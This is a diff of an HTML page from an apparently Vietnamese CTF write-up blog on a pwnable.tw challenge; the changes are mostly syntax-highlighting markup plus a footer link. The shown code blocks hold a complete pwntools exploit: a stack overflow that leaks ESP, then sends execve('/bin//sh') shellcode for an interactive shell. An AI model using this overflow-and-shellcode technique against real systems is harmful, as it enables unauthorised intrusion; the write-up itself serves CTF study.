@@ -295,8 +295,8 @@ Giả sử chúng ta tiếp tục nhập vào, các giá trị tại các địa
 
 <p>Lợi dụng việc gọi <code class="language-plaintext highlighter-rouge">sys_write</code> lần thứ 2. Chỉ cần in ra 4 bytes đầu tiên, chúng ta sẽ lấy được địa chỉ <code class="language-plaintext highlighter-rouge">ESP</code> ban đầu.</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'x'</span> <span class="o">*</span> <span class="mh">0x14</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">':'</span><span class="p">,</span> <span class="n">payload1</span><span class="p">)</span> 
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x14</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">,</span> <span class="n">payload1</span><span class="p">)</span> 
 <span class="n">esp_leaked</span> <span class="o">=</span> <span class="nf">u32</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="nf">recv</span><span class="p">()[:</span><span class="mi">4</span><span class="p">])</span>
 </code></pre></div></div>
 <h3 id="công-việc-2">
@@ -316,7 +316,7 @@ Giả sử chúng ta tiếp tục nhập vào, các giá trị tại các địa
 
 <p>Sau khi <code class="language-plaintext highlighter-rouge">sys_read</code> được gọi, <code class="language-plaintext highlighter-rouge">ESP + 0x14</code>, nghĩa là <code class="language-plaintext highlighter-rouge">ESP</code> đứng ở <code class="language-plaintext highlighter-rouge">X + 16</code>. Ở <code class="language-plaintext highlighter-rouge">X + 16</code>, chúng ta chỉ cần gán cho nó giá trị là <code class="language-plaintext highlighter-rouge">X + 20</code>, nơi shellcode được viết. Hàm trả về sẽ là địa chỉ shellcode được bắt đầu.</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'x'</span> <span class="o">*</span> <span class="mh">0x14</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="n">leaked_esp</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x14</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="n">leaked_esp</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span>
 </code></pre></div></div>
 <h3 id="v-mã-khai-thác">
   
@@ -328,14 +328,14 @@ Giả sử chúng ta tiếp tục nhập vào, các giá trị tại các địa
     
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">r</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="s">"chall.pwnable.tw"</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">chall.pwnable.tw</span><span class="sh">"</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
 
-<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span class="s">"</span> 
+<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span class="sh">"</span> 
 
-<span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'x'</span> <span class="o">*</span> <span class="mh">0x14</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">':'</span><span class="p">,</span> <span class="n">payload1</span><span class="p">)</span> 
+<span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x14</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">,</span> <span class="n">payload1</span><span class="p">)</span> 
 <span class="n">esp_leaked</span> <span class="o">=</span> <span class="nf">u32</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="nf">recv</span><span class="p">()[:</span><span class="mi">4</span><span class="p">])</span>
-<span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'x'</span> <span class="o">*</span> <span class="mh">0x14</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="n">esp_leaked</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x14</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="n">esp_leaked</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span>
 <span class="n">r</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
 
 <span class="n">r</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
@@ -487,8 +487,8 @@ Giả sử chúng ta tiếp tục nhập vào, các giá trị tại các địa
 
 <p>Lợi dụng việc gọi <code class="language-plaintext highlighter-rouge">sys_write</code> lần thứ 2. Chỉ cần in ra 4 bytes đầu tiên, chúng ta sẽ lấy được địa chỉ <code class="language-plaintext highlighter-rouge">ESP</code> ban đầu.</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'x'</span> <span class="o">*</span> <span class="mh">0x14</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">':'</span><span class="p">,</span> <span class="n">payload1</span><span class="p">)</span> 
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x14</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">,</span> <span class="n">payload1</span><span class="p">)</span> 
 <span class="n">esp_leaked</span> <span class="o">=</span> <span class="nf">u32</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="nf">recv</span><span class="p">()[:</span><span class="mi">4</span><span class="p">])</span>
 </code></pre></div></div>
 
@@ -502,20 +502,20 @@ Giả sử chúng ta tiếp tục nhập vào, các giá trị tại các địa
 
 <p>Sau khi <code class="language-plaintext highlighter-rouge">sys_read</code> được gọi, <code class="language-plaintext highlighter-rouge">ESP + 0x14</code>, nghĩa là <code class="language-plaintext highlighter-rouge">ESP</code> đứng ở <code class="language-plaintext highlighter-rouge">X + 16</code>. Ở <code class="language-plaintext highlighter-rouge">X + 16</code>, chúng ta chỉ cần gán cho nó giá trị là <code class="language-plaintext highlighter-rouge">X + 20</code>, nơi shellcode được viết. Hàm trả về sẽ là địa chỉ shellcode được bắt đầu.</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'x'</span> <span class="o">*</span> <span class="mh">0x14</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="n">leaked_esp</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x14</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="n">leaked_esp</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span>
 </code></pre></div></div>
 
 <h3 id="v-mã-khai-thác">V. Mã khai thác</h3>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">r</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="s">"chall.pwnable.tw"</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">chall.pwnable.tw</span><span class="sh">"</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
 
-<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span class="s">"</span> 
+<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span class="sh">"</span> 
 
-<span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'x'</span> <span class="o">*</span> <span class="mh">0x14</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">':'</span><span class="p">,</span> <span class="n">payload1</span><span class="p">)</span> 
+<span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x14</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">,</span> <span class="n">payload1</span><span class="p">)</span> 
 <span class="n">esp_leaked</span> <span class="o">=</span> <span class="nf">u32</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="nf">recv</span><span class="p">()[:</span><span class="mi">4</span><span class="p">])</span>
-<span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'x'</span> <span class="o">*</span> <span class="mh">0x14</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="n">esp_leaked</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x14</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="n">esp_leaked</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span>
 <span class="n">r</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
 
 <span class="n">r</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
@@ -568,11 +568,21 @@ Giả sử chúng ta tiếp tục nhập vào, các giá trị tại các địa
 
           </li>
           
+
+          
+          <li>
+            <a href="https://www.linkedin.com/in/geordo">
+  <span class="icon icon--linkedin"><svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414"><path d="M13.632 13.635h-2.37V9.922c0-.886-.018-2.025-1.234-2.025-1.235 0-1.424.964-1.424 1.96v3.778h-2.37V6H8.51v1.04h.03c.318-.6 1.092-1.233 2.247-1.233 2.4 0 2.845 1.58 2.845 3.637v4.188zM3.558 4.955c-.762 0-1.376-.617-1.376-1.377 0-.758.614-1.375 1.376-1.375.76 0 1.376.617 1.376 1.375 0 .76-.617 1.377-1.376 1.377zm1.188 8.68H2.37V6h2.376v7.635zM14.816 0H1.18C.528 0 0 .516 0 1.153v13.694C0 15.484.528 16 1.18 16h13.635c.652 0 1.185-.516 1.185-1.153V1.153C16 .516 15.467 0 14.815 0z" fill-rule="nonzero"/></svg></span>
+  <span class="label">geordo</span>
+</a>
+
+          </li>
+          
         </ul>
       </div>
 
       <div class="footer-col footer-col-3">
-        <p>Just a small boy with big fat dream 
+        <p>Just a small boy with big fat dream 💭
 </p>
       </div>
     </div>
